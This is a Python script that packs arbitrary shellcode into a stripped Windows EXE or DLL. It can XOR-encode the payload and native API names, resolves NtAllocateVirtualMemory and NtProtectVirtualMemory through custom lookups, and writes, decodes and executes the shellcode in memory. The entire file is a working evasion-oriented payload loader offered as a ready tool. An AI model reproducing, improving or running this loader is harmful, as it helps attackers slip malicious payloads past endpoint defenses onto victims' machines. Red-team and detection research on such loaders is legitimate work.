import os
import sys
import subprocess
import random

if len(sys.argv) < 3:
    script_name = os.path.basename(sys.argv[0])
    print(f"Usage: {script_name} <shellcode.bin> <output.exe> [-dll] [-xor] [-l <key_length>] [-k <key>]")
    sys.exit(1)

bin_file = sys.argv[1]
output_exe = sys.argv[2]
use_dll = "-dll" in sys.argv
use_xor = "-xor" in sys.argv or "-i" in sys.argv or "-l" in sys.argv or "-k" in sys.argv

key_length = 1
key = [random.randint(1, 255) for _ in range(key_length)]

if "-l" in sys.argv:
    l_index = sys.argv.index("-l")
    key_length = int(sys.argv[l_index + 1])
    if key_length not in (1, 2):
        print("Error: key length must be 1 or 2 bytes")
        sys.exit(1)
    key = [random.randint(1, 255) for _ in range(key_length)]

if "-k" in sys.argv:
    k_value = sys.argv[sys.argv.index("-k") + 1]

    if "," in k_value:
        key = [int(b, 0) for b in k_value.split(",")]
    elif k_value.startswith("0x") and len(k_value) > 2:
        hex_str = k_value[2:]
        if len(hex_str) % 2 != 0:
            hex_str = "0" + hex_str
        key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
    else:
        key = [int(k_value, 0)]

    if len(key) not in (1, 2):
        print("Error: key length must be 1 or 2 bytes")
        sys.exit(1)

    key_length = len(key)

with open(bin_file, "rb") as f:
    shellcode = f.read()

def xor_bytes(data: bytes, key: list[int]) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def xor_c_string(s: str, key: list[int]) -> bytes:
    data = s.encode() + b'\x00'
    return xor_bytes(data, key)

def bytes_to_c_array(b: bytes) -> str:
    return ",".join(f"0x{byte:02x}" for byte in b)

c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]

if use_xor:
    xor_shellcode = xor_bytes(shellcode, key)
    xor_c_strings_enc = [xor_c_string(s, key) for s in c_strings]
else:
    xor_shellcode = shellcode
    xor_c_strings_enc = [s.encode() + b'\x00' for s in c_strings]

offsets = []
current_offset = 0
for s in xor_c_strings_enc:
    offsets.append(current_offset)
    current_offset += len(s)
stackbuf_size = current_offset

shellcode_array = bytes_to_c_array(xor_shellcode)
combined_array = bytes_to_c_array(b"".join(xor_c_strings_enc))
key_array = bytes_to_c_array(key)

c_code = f'''#include "winapi_loader.h"

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

__attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
__attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};

#ifdef XOR
__attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
#endif

__attribute__((section(".text.start")))
void _start() {{
    unsigned char stackbuf[{stackbuf_size}];

    for (SIZE_T i = 0; i < sizeof(stackbuf); i++)
    #ifdef XOR
        stackbuf[i] = enc_strings[i] ^ key[i % sizeof(key)];
    #else
        stackbuf[i] = enc_strings[i];
    #endif

    char* ntdll_dll = (char*)&stackbuf[{offsets[0]}];
    HMODULE hNtdll = myGetModuleHandleA(ntdll_dll);

    char* ntallocatevirtualmemory = (char*)&stackbuf[{offsets[1]}];
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);

    LPVOID execMemory = NULL;
    SIZE_T regionSize = sizeof(shellcode);
    pNtAllocateVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    for (SIZE_T i = 0; i < sizeof(shellcode); i++)
    #ifdef XOR
        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % sizeof(key)];
    #else
        ((unsigned char*)execMemory)[i] = shellcode[i];
    #endif

    char* ntprotectvirtualmemory = (char*)&stackbuf[{offsets[2]}];
    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);

    ULONG oldProtect;
    pNtProtectVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    ((void(*)())execMemory)();
}}
'''

compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    "-s", "-nostdlib", "-nostartfiles", "-ffreestanding",
    "-fno-ident", "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-fPIC", "-fno-asynchronous-unwind-tables",
    "-x", "c", "-", "-o", output_exe
]

if use_xor:
    compile_cmd.append("-DXOR")
if use_dll:
    compile_cmd.append("-shared")
proc = subprocess.run(compile_cmd, input=c_code.encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
if proc.returncode != 0:
    print(proc.stderr.decode())
    sys.exit(1)

if use_xor and use_dll:
    print(f"[+] DLL generated: {output_exe} (XOR key: {key_array})")
elif use_dll:
    print(f"[+] DLL generated: {output_exe}")
elif use_xor:
    print(f"[+] Executable generated: {output_exe} (XOR key: {key_array})")
else:
    print(f"[+] Executable generated: {output_exe}")
